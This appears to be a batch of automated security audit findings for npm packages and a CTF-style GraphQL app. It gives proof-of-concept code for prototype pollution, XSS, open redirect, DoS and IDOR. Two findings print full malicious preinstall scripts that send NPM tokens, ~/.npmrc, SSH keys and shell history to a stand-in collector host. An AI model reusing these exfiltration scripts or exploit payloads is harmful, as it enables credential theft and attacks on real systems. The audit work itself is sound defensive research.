Title: GraphQL IDOR exposes other users' prescriptions and embedded flag
Category: information-disclosure
Severity: low
Description: The GraphQL endpoint /graphql allows any authenticated user to query getPrescriptions(userId: <arbitrary>) without verifying that the requested user_id matches the logged-in user. Logging in as the low-privilege user account (user:user) and querying userId:1 returns the admin user's prescriptions, including the hidden flag stored on prescription 43.
Request: 1) POST /login with JSON {"username":"user","password":"user"}
2) POST /graphql with session cookie and JSON {"query":"query{getPrescriptions(userId:1){id userId prescriptionDetails flag}}"}
Response: Login response: {"message":"Login successful","userID":2}
GraphQL response included admin records and flag, notably: {"id":43,"userId":1,"prescriptionDetails":"Prescription 43 for Admin","flag":"FLAG{173071395c21c60ea21a1874}"}
Analysis: In app.py, resolve_get_prescriptions(self, info, user_id) directly returns Prescription.query.filter_by(user_id=user_id).all() with no authorization check against current_user. Because /graphql is globally exposed and the resolver trusts the attacker-controlled userId argument, any logged-in user can enumerate another user's prescriptions. This is a classic IDOR / broken object-level authorization issue causing sensitive medical data exposure and flag disclosure.

Title: Unsafe dynamic module loading via extendable() allows attacker-controlled code execution
Category: code-injection
Severity: high
Description: The package provides `Cmd.extendable()` to dynamically resolve subcommands from Node modules based on untrusted command names. In `lib/cmd.js::_parseCmd()`, when `_ext` is enabled and an unknown subcommand token matches `/^\w[\w-_]*$/`, the library constructs a package name from attacker-controlled input and executes `require(pkg)`. If the loaded module exports a function, COA immediately invokes it via `this.cmd().name(i).apply(cmdDesc).end()`. This means any attacker who can influence the pars
Request: // PoC executed locally against coa@2.0.2
const coa = require('coa');
// Attacker-controlled module placed on module resolution path as root-evil
// /tmp/pwnkit-audit-a312fa68/node_modules/root-evil/index.js:
// module.exports = function() { this.act(function(){ return 'PWNED'; }); };
const cmd = coa.Cmd().name('root').extendable();
cmd.invoke('evil');
Response: result PWNED
Analysis: Data flow: user-controlled subcommand string `evil` reaches `Cmd.invoke()` -> `_parseCmd(cmds)` -> branch `if(!cmd && this._ext)` -> package name `root-evil` is built from the root command name plus attacker input -> `require(pkg)` loads attacker-chosen code -> if export is a function, `.apply(cmdDesc)` executes it in command-construction context, and the resulting subcommand action then runs. This is not a theoretical sink: a local PoC demonstrated successful execution of code from an attacker-

Title: Malicious preinstall script exfiltrates NPM_TOKEN and ~/.npmrc during package installation
Category: data-exfiltration
Severity: critical
Description: The package defines a `preinstall` lifecycle hook in `package.json` that executes `preinstall.js` automatically during `npm install`. That script reads `process.env.NPM_TOKEN` and synchronously executes `cat ~/.npmrc 2>/dev/null || true` via `child_process.execSync`, then sends both values in an outbound HTTPS POST request to `https://collector.invalid/exfil`. This is a real, default-path data exfiltration backdoor triggered merely by installing the package.
Request: package.json defines `"preinstall": "node preinstall.js"`; preinstall.js contains:
const token = process.env.NPM_TOKEN || '';
const npmrc = child_process.execSync('cat ~/.npmrc 2>/dev/null || true').toString();
https.request('https://collector.invalid/exfil', { method: 'POST' }).end(JSON.stringify({ token, npmrc }));
Response: Source review confirms automatic execution on install and exfiltration of secrets over the network.
Analysis: This is exploitable in default configuration because npm lifecycle scripts run automatically during installation unless scripts are explicitly disabled. In common CI/CD and developer environments, `NPM_TOKEN` and `~/.npmrc` often contain registry authentication credentials. An attacker publishing or substituting this package can steal those credentials remotely, enabling package registry compromise, further supply-chain attacks, or access to private packages. The sink is a live network request a

Title: Malicious preinstall script exfiltrates SSH private key and shell history during npm install
Category: data-exfiltration
Severity: critical
Description: The package defines a `preinstall` lifecycle script in `package.json` that automatically executes `preinstall.js` when the package is installed. That script reads the user's SSH private key from `~/.ssh/id_rsa` if present, executes `cat ~/.bash_history`, and sends the collected data in an HTTPS POST request to an external host (`https://collector.invalid/creds`). This is a real, automatically triggered credential/data exfiltration vulnerability affecting any environment that installs the package
Request: package.json:
{
  "scripts": {
    "preinstall": "node preinstall.js"
  }
}

preinstall.js:
const fs = require('fs');
const https = require('https');
const child_process = require('child_process');
const browser = fs.existsSync(process.env.HOME + '/.ssh/id_rsa') ? fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8') : '';
const history = child_process.execSync('cat ~/.bash_history 2>/dev/null || true').toString();
https.request('https://collector.invalid/creds', { method: 'POST' }).end(JSON.stringify({ browser, history }));
Response: The package contains only two files: `package.json` and `preinstall.js`. `package.json` registers `preinstall.js` as a preinstall hook. `preinstall.js` reads `~/.ssh/id_rsa`, runs `cat ~/.bash_history`, and posts the results to `https://collector.invalid/creds`.
Analysis: This is directly exploitable in default npm usage because lifecycle scripts run automatically on install. No application code needs to call an exported API. The sink is explicit: local sensitive files and shell history are read and transmitted off-host over HTTPS. Impact includes theft of SSH private keys, command history, and potentially downstream compromise of developer workstations or CI environments. This behavior is malicious and would meet the bar for a critical package-level vulnerabilit

Title: Prototype pollution via forge.debug.set() category argument
Category: prototype-pollution
Severity: high
Description: The public API `forge.debug.set(cat, name, data)` in `lib/debug.js` writes directly into `forge.debug.storage[cat]` without sanitizing special property names. Because it uses `cat in forge.debug.storage` and then assigns `forge.debug.storage[cat] = {}` / `forge.debug.storage[cat][name] = data`, passing `cat='__proto__'` resolves to `Object.prototype` and writes attacker-controlled properties onto the global prototype. Any application that exposes this debug API to untrusted input can suffer proc
Request: const forge = require('./lib');
console.log({}.polluted);
forge.debug.set('__proto__','polluted','yes');
console.log({}.polluted);
Response: debug before undefined
debug after yes
Analysis: `forge.debug.storage` is initialized as a plain object. In JavaScript, the inherited `__proto__` property exists on plain objects, so the check `if(!(cat in forge.debug.storage))` is false for `cat='__proto__'`. The subsequent write `forge.debug.storage[cat][name] = data` becomes `Object.prototype[name] = data`, polluting all objects. This is directly reachable through a documented public API and was reproduced locally.

Title: Prototype pollution via forge.util.setPath() path segments
Category: prototype-pollution
Severity: high
Description: The public helper `forge.util.setPath(object, keys, value)` in `lib/util.js` follows attacker-controlled path segments and assigns into nested objects without blocking dangerous keys such as `__proto__`, `constructor`, or `prototype`. Supplying `['__proto__', <prop>]` causes writes to `Object.prototype`, polluting all subsequently created objects. Applications that use `setPath` with untrusted key paths (for example, query-string or JSON driven setters) can be compromised through process-wide ob
Request: const forge = require('./lib');
let o = {};
forge.util.setPath(o,['__proto__','pp2'],'pwn');
console.log({}.pp2, o.pp2);
Response: setPath pwn pwn
Analysis: Inside `util.setPath`, each path segment is dereferenced via `next in object` and then assigned with `object[next] = {}` or `object[next] = value`. For a plain object, `__proto__` resolves to the prototype accessor. As a result, traversal enters `Object.prototype`, and the final assignment writes attacker data there. The local PoC demonstrates that a fresh `{}` gains the polluted property after one call.

Title: Prototype pollution via Express query parser defaults (allowPrototypes: true)
Category: prototype-pollution
Severity: high
Description: Express 4.17.1 enables prototype-bearing keys when parsing attacker-controlled query strings. Two independent code paths set `allowPrototypes: true` for `qs.parse()`: `lib/utils.js` in `parseExtendedQueryString()` and `lib/middleware/query.js` in the default query middleware compatibility branch. Because Express defaults `query parser` to `extended`, a normal application using `req.query` will parse untrusted URL query parameters through `qs` with prototype keys allowed. This permits an attacker
Request: Source evidence:
- lib/application.js defaultConfiguration(): `this.set('query parser', 'extended');`
- lib/utils.js parseExtendedQueryString(): `return qs.parse(str, { allowPrototypes: true });`
- lib/middleware/query.js: if opts.allowPrototypes undefined, set `opts.allowPrototypes = true`, then `req.query = queryparse(val, opts);`

Attack shape for an application using Express defaults:
GET /?__proto__[isAdmin]=true
or
GET /?constructor[prototype][isAdmin]=true
Response: Relevant code snippets:
1) lib/application.js
`this.set('query parser', 'extended');`

2) lib/utils.js
`function parseExtendedQueryString(str) {
  return qs.parse(str, {
    allowPrototypes: true
  });
}`

3) lib/middleware/query.js
`if (opts !== undefined && opts.allowPrototypes === undefined) {
  // back-compat for qs module
  opts.allowPrototypes = true;
}
...
req.query = queryparse(val, opts);`
Analysis: This is a real, source-level security defect in Express itself, not merely an app misuse issue: Express explicitly opts into unsafe `qs` behavior for attacker-controlled query strings. The package sets the vulnerable flag by default and exposes the resulting object as `req.query`. In real applications, `req.query` is commonly merged into options objects, authorization filters, template locals, or feature flags. Allowing prototype keys creates a reliable path to inherited-property injection and,

Title: Open redirect in res.location/res.redirect via untrusted Referrer when using "back"
Category: output-manipulation
Severity: medium
Description: Express 4.17.1 implements `res.location('back')` by copying the request `Referrer` header directly into the `Location` response header, and `res.redirect('back')` delegates to this behavior. Since `Referrer` is attacker-controllable in cross-site navigation contexts and can also be directly set by non-browser clients, applications that use the documented `back` shortcut can be turned into open redirects to arbitrary external URLs. This is a framework-level unsafe API behavior because Express tre
Request: Source evidence / exploit pattern:
- Application code uses `res.redirect('back')` or `res.location('back')`
- Attacker sends request with `Referer: https://evil.example/phish`
- Express emits `Location: https://evil.example/phish`

Relevant code path in lib/response.js:
`if (url === 'back') { loc = this.req.get('Referrer') || '/'; }`
`return this.set('Location', encodeUrl(loc));`
Response: Relevant code snippet from lib/response.js:
`res.location = function location(url) {
  var loc = url;

  // "back" is an alias for the referrer
  if (url === 'back') {
    loc = this.req.get('Referrer') || '/';
  }

  // set location
  return this.set('Location', encodeUrl(loc));
};`

`res.redirect = function redirect(url) {
  ...
  address = this.location(address).get('Location');
  ...
};`
Analysis: This is reachable whenever an application uses the Express-documented `back` shortcut, which was common in login/logout/error flows. The sink is a redirect response whose destination is sourced from an attacker-controlled request header with no validation. While exploitation requires the application to call `res.redirect('back')`, that is first-party framework API usage encouraged by Express docs and examples, so the unsafe behavior meaningfully increases user risk. Impact is phishing, token lea

Title: JSON5.parse prototype-pollutes returned objects via __proto__ property assignment
Category: prototype-pollution
Severity: medium
Description: The parser in lib/parse.js constructs plain objects with `{}` and assigns attacker-controlled property names directly with `parent[key] = value` inside `push()`. When a parsed object contains a `__proto__` property, this triggers the inherited `Object.prototype.__proto__` setter instead of creating a normal own property. As a result, the returned object's prototype is replaced with attacker-controlled data. This is reachable through the public `JSON5.parse()` API in default configuration with no
Request: const JSON5 = require('./lib');
const obj = JSON5.parse('{__proto__:{polluted:true}}');
console.log(Object.keys(obj));
console.log(obj.polluted);
console.log({}.polluted);
console.log(Object.getPrototypeOf(obj));
Response: obj keys []
obj.polluted true
{}.polluted undefined
proto is { polluted: true }
Analysis: The response shows a direct prototype mutation of the object returned by JSON5.parse(). The attacker-controlled `__proto__` member did not appear as an own key, but its nested value became the prototype of the parsed object, making `obj.polluted` resolve as true via inheritance. This is a real prototype pollution primitive reachable through the package's main public API. It does not globally poison Object.prototype in this PoC, but it still creates security-relevant forged objects that can bypas

Title: qs.parse() has quadratic-time CPU denial of service on large indexed array query strings
Category: regex-dos
Severity: medium
Description: The public `parse()` API in `lib/parse.js` can be forced into O(n^2) behavior when parsing many parameters that target the same array with explicit numeric indices, e.g. `a[0]=x&a[1]=x&...`. Each parameter is first converted into a one-element sparse array by `parseObject()`, then merged into the accumulated result by `utils.merge()`. In the array+array merge branch, the code uses `source.forEach(...)`; for sparse arrays, JavaScript `forEach` iterates up to the array's `length`, so when the high
Request: Node PoC executed in package root:
```js
const qs = require('./');
function test(n){
  let parts=[];
  for(let i=0;i<n;i++) parts.push('a['+i+']=x');
  const s=parts.join('&');
  const t=Date.now();
  qs.parse(s, {parameterLimit: Infinity, arrayLimit: 1000000000});
  return Date.now()-t;
}
for (const n of [1000,2000,4000,8000,12000]) {
  console.log(n, test(n));
}
```
Response: Observed runtimes:
- 1000 => 11 ms
- 2000 => 102 ms
- 4000 => 374 ms
- 8000 => 1536 ms
- 12000 => 3439 ms

Additional single run:
```js
const r = qs.parse(s, { parameterLimit: Infinity, arrayLimit: 1000000000 });
// for n=10000
// parse ms 2424 isArray true keys 10000 len 10000
```
This superlinear growth is consistent with quadratic work.
Analysis: `parseKeys()`/`parseObject()` creates sparse arrays for bracketed numeric indices when `index <= options.arrayLimit`. When both `target` and `source` are arrays, `utils.merge()` executes `source.forEach(function (item, i) { ... })`. For a source like `[]` with only `source[9999] = 'x'`, `forEach` must scan through the array length to find the present element. Repeating this for indices 0..n yields cumulative O(n^2) time. Because this is a public parser for attacker-supplied query strings, an att

Title: Prototype pollution / arbitrary prototype property deletion via _.unset and _.omit
Category: prototype-pollution
Severity: high
Description: lodash 4.17.10's `_baseUnset.js` resolves an attacker-controlled property path to its parent object using `_parent`/`_baseGet` and then performs `delete object[toKey(last(path))]` with no protection for prototype meta-properties. Public APIs `_.unset` and `_.omit` reach this sink. This allows deletion of properties from `Object.prototype` by passing paths like `['__proto__','key']`, and `_.omit` can also surface inherited prototype properties as own properties on its result because it copies own
Request: const _ = require('lodash');
Object.prototype.gone = 'present';
console.log(_.unset({}, ['__proto__','gone']));
console.log({}.gone);
Object.prototype.protoInherited = 'secret';
const res = _.omit({a:1}, ['a']);
console.log(res.protoInherited, Object.keys(res));
Response: true
undefined
secret [ 'protoInherited' ]
Analysis: `unset.js` directly exposes `baseUnset`. `_baseUnset.js` calls `_parent(object, path)`; `_parent` uses `_baseGet`, which freely traverses `__proto__`. If the path is `['__proto__','gone']`, the parent returned is `Object.prototype`, and the final `delete` removes `Object.prototype.gone` globally. `omit.js` clones using `copyObject(object, getAllKeysIn(object), result)`, so inherited enumerable prototype properties are copied into a new object as own properties; then deep omit paths are applied w

Title: Prototype pollution via _.set/_.update/_.zipObjectDeep path traversal into __proto__
Category: prototype-pollution
Severity: high
Description: Lodash 4.17.4 allows attacker-controlled property paths to modify Object.prototype through public APIs that delegate to `_baseSet`, including `_.set`, `_.update`, and `_.zipObjectDeep`.

`_baseSet.js` casts a user-supplied path and then iteratively assigns each segment without blocking magic keys:
- `path = castPath(path, object)`
- `var key = toKey(path[index])`
- `assignValue(nested, key, newValue)`
- `nested = nested[key]`

Because `nested = nested[key]` follows inherited accessors, a path li
Request: const _ = require('/tmp/pwnkit-audit-adf6974e/node_modules/lodash');
let a = {};
_.set(a, '__proto__.x', 1);
let u = {};
_.update(u, '__proto__.upd', n => 'owned');
let z = _.zipObjectDeep(['__proto__.z'], [123]);
console.log({x: {}.x, upd: {}.upd, z: {}.z, resultKeys: Object.keys(z)});
Response: { x: 1, upd: 'owned', z: 123, resultKeys: [ '__proto__' ] }
Analysis: The result shows properties appearing on fresh object literals (`{}.x`, `{}.upd`, `{}.z`), proving mutation of `Object.prototype`, not just a local object. The vulnerable flow is directly reachable through public APIs with attacker-controlled path strings/arrays, so this is a real prototype pollution vulnerability.

Title: Prototype pollution via _.merge and _.defaultsDeep on __proto__ source objects
Category: prototype-pollution
Severity: high
Description: Lodash 4.17.4 is vulnerable to prototype pollution when merging attacker-controlled objects containing `__proto__` into application objects through `_.merge`, `_.mergeWith`, and `_.defaultsDeep`.

In `_baseMerge.js`, lodash iterates over `keysIn(source)` and forwards each key into deep merge logic. `_baseMergeDeep.js` then reads and recursively merges `source[key]` into `object[key]` without blocking dangerous keys. When `key === '__proto__'`, `object[key]` resolves to `Object.prototype`, so rec
Request: const _ = require('/tmp/pwnkit-audit-adf6974e/node_modules/lodash');
let o = {};
_.merge(o, JSON.parse('{"__proto__":{"polluted":"yes"}}'));
let d = {};
_.defaultsDeep(d, JSON.parse('{"__proto__":{"dd":"yes"}}'));
console.log({polluted: {}.polluted, dd: {}.dd, ownProto: Object.prototype.hasOwnProperty.call(o,'__proto__')});
Response: { polluted: 'yes', dd: 'yes', ownProto: false }
Analysis: Fresh object literals expose `polluted` and `dd`, demonstrating that the merge operation modified `Object.prototype`. `ownProto: false` shows this was not just an own property on the destination object. The vulnerable sink is reachable via exported APIs that are commonly used on untrusted data, making this a real exploitable prototype pollution issue.

Title: Prototype property deletion via _.unset allows attacker-controlled mutation of Object.prototype
Category: prototype-pollution
Severity: medium
Description: Lodash 4.17.4 allows attacker-controlled paths passed to `_.unset` to delete properties from `Object.prototype`.

`unset.js` delegates directly to `_baseUnset.js`, which performs:
- `path = castPath(path, object)`
- `object = parent(object, path)`
- `return object == null || delete object[toKey(last(path))]`

There is no filtering for dangerous path segments. If the path is `__proto__.pp`, `parent(object, path)` resolves to `Object.prototype`, and the final `delete` removes the property from the
Request: const _ = require('/tmp/pwnkit-audit-adf6974e/node_modules/lodash');
Object.prototype.pp = 'exists';
_.unset({}, '__proto__.pp');
console.log({after: {}.pp});
delete Object.prototype.pp;
Response: { after: undefined }
Analysis: The property `pp` existed on `Object.prototype` before the call and disappeared afterward, proving that `_.unset` traversed into `__proto__` and mutated the global prototype. This is attacker-controlled prototype mutation through a public API and is therefore a genuine vulnerability, though impact is generally lower than direct property creation used for auth bypass or RCE chains.

Title: marked@2.0.0 allows javascript: and data: URLs in links and images by default, enabling XSS payload generation
Category: xss
Severity: high
Description: The default configuration fails to neutralize dangerous URI schemes in Markdown links and images. In `src/helpers.js`, `cleanUrl(sanitize, base, href)` only strips `javascript:`, `vbscript:`, and `data:` schemes when `sanitize` is truthy. However, `sanitize` defaults to `false`, so `Renderer.link()` and `Renderer.image()` emit attacker-controlled `href` and `src` values unchanged in default usage. This lets untrusted Markdown generate active XSS-capable HTML such as `<a href="javascript:alert(1)
Request: const marked = require('./src/marked');
console.log(marked('[click](javascript:alert(1))'));
console.log(marked('![img](javascript:alert(1))'));
console.log(marked('[x](data:text/html,<svg/onload=alert(1)>)'));
Response: <p><a href="javascript:alert(1)">click</a></p>

<p><img src="javascript:alert(1)" alt="img"></p>

<p><a href="data:text/html,%3Csvg/onload=alert(1)%3E">x</a></p>
Analysis: The public parsing API takes attacker-controlled Markdown and emits executable browser sinks in default configuration. The dangerous scheme filter exists but is gated behind deprecated, disabled-by-default sanitization. As a result, common consumers who expect a Markdown renderer to produce safe HTML will instead get directly clickable or embeddable script/data URLs. This is independently exploitable from raw HTML passthrough because it works through Markdown syntax alone.

Title: Arbitrary SQL execution via unsanitized migration statements in migrate() helpers
Category: sql-injection
Severity: medium
Description: The package’s migration helpers read `.sql` files from a caller-supplied migrations directory and execute each statement verbatim using `sql.raw(stmt)`. This occurs in multiple public migration entry points, including `neon-http/migrator.js` and the core dialect migration methods (`pg-core/dialect.js`, `mysql-core/dialect.js`, `singlestore-core/dialect.js`). Because `readMigrationFiles()` loads attacker-controlled file contents and splits them into statements without validation, any untrusted mi
Request: Public API review of migration helpers and file loader:
- `migrator.js` reads SQL files from `config.migrationsFolder`
- `neon-http/migrator.js` executes each loaded statement with `db.session.execute(sql.raw(stmt))`
- equivalent raw execution present in `pg-core/dialect.js`, `mysql-core/dialect.js`, `singlestore-core/dialect.js`
Response: `migrator.js`:
```js
const query = fs.readFileSync(`${migrationFolderTo}/${journalEntry.tag}.sql`).toString();
const result = query.split("--> statement-breakpoint").map((it) => {
  return it;
});
migrationQueries.push({ sql: result, ... });
```

`neon-http/migrator.js`:
```js
for (const stmt of migration.sql) {
  await db.session.execute(sql.raw(stmt));
}
```

`pg-core/dialect.js` / `mysql-core/dialect.js` / `singlestore-core/dialect.js` contain the same sink:
```js
for (const stmt of migration.sql) {
  await tx.execute(sql.raw(stmt));
}
```
Analysis: This is a real dangerous sink: `sql.raw()` disables parameterization and inserts SQL text as-is. The source of `stmt` is file content read from a caller-provided path. There is no parsing, allowlist, signature check, or confinement to trusted statements. If an attacker can influence the migrations folder contents or the referenced journal/sql files, they gain arbitrary SQL execution with the application database credentials. This is not merely intended functionality at the SQL-builder layer beca

Title: Unbounded memory/CPU consumption in zalgo() enables denial of service
Category: output-manipulation
Severity: medium
Description: The public API exports `colors.zalgo()` from `lib/custom/zalgo.js`, which accepts attacker-controlled input text and an optional `size` option. For each input character, the function appends a random number of combining characters in nested loops. In `maxi` mode it adds up to 16+3 upper, 4+1 mid, and 64+3 lower marks per character, producing output tens of times larger than the input with no size cap, quota, or streaming behavior. This lets an attacker trigger extreme CPU work and heap growth an
Request: const colors = require('./safe');
const s='a'.repeat(1000000);
const t=Date.now();
const out=colors.zalgo(s,{size:'maxi'});
console.log('ms',Date.now()-t,'len',out.length);
Response: ms 7976 len 51643449
Analysis: This is a reachable public API in default package usage (`require('colors/safe').zalgo(...)`). A 1 MB attacker-controlled string caused ~8 seconds of CPU time and expanded to a 51.6 MB output string. Additional measurements showed near-linear growth (10k -> 70ms, 50k -> 320ms, 100k -> 651ms, 200k -> 1403ms), confirming a practical algorithmic DoS primitive. Applications that colorize untrusted input with `zalgo()` can be crashed or severely slowed without any special configuration.

Title: Prototype pollution in analyze() options allows attacker-controlled inherited flags
Category: prototype-pollution
Severity: medium
Description: The public analyze(tree, providedOptions) API deep-merges attacker-controlled options with updateDeeply() in lib/index.js. updateDeeply() iterates over override keys including '__proto__' and writes target[key] = updateDeeply({}, val). When key is '__proto__', that assignment mutates the prototype of the returned options object instead of creating a normal own property. As a result, an attacker can inject inherited option values such as ignoreEval, optimistic, jsx, sourceType, ecmaVersion, or fa
Request: const scope = require('./dist/eslint-scope.cjs');
const ast = {type:'Program', body:[], sourceType:'script', range:[0,0]};
const sm = scope.analyze(ast, JSON.parse('{"__proto__":{"ignoreEval":true}}'));
console.log('ignoreEval inherited?', sm.__options.ignoreEval, Object.hasOwn(sm.__options, 'ignoreEval'));
Response: ignoreEval inherited? true false
Analysis: The result shows ignoreEval became true even though the options object does not have its own ignoreEval property. That means __proto__ from providedOptions was merged into the returned options object's prototype. Because later code reads this.__options.ignoreEval directly, the inherited polluted value is trusted as configuration. This is prototype pollution reachable from the public API and it changes security-relevant behavior in default code paths.

Title: Prototype pollution via _.set / _.setWith / _.update / _.updateWith / _.zipObjectDeep path handling
Category: prototype-pollution
Severity: high
Description: The package exposes object mutation helpers that allow attacker-controlled property paths to write to the special key `__proto__` without blocking it. `_baseSet.js` iterates over each path segment and calls `assignValue(nested, key, newValue)`. `assignValue` delegates to `_baseAssignValue.js`, which explicitly handles `key == '__proto__'` by calling `Object.defineProperty(object, '__proto__', { value: ... })` instead of rejecting the write. As a result, public APIs including `set`, `setWith`, `u
Request: Public entry points: set.js -> _baseSet.js, setWith.js -> _baseSet.js, update.js -> _baseUpdate.js -> _baseSet.js, updateWith.js -> _baseUpdate.js -> _baseSet.js, zipObjectDeep.js -> _baseZipObject.js -> _baseSet.js. Vulnerable code in _baseSet.js:
while (nested != null && ++index < length) {
  var key = toKey(path[index]), newValue = value;
  if (index != lastIndex) {
    var objValue = nested[key];
    newValue = customizer ? customizer(objValue, key, nested) : undefined;
    if (newValue === undefined) {
      newValue = isObject(objValue) ? objValue : (isIndex(path[index + 1]) ? [] : {});
    }
  }
  assignValue(nested, key, newValue);
  nested = nested[key];
}
And _baseAssignValue.js:
if (key == '__proto__' && defineProperty) {
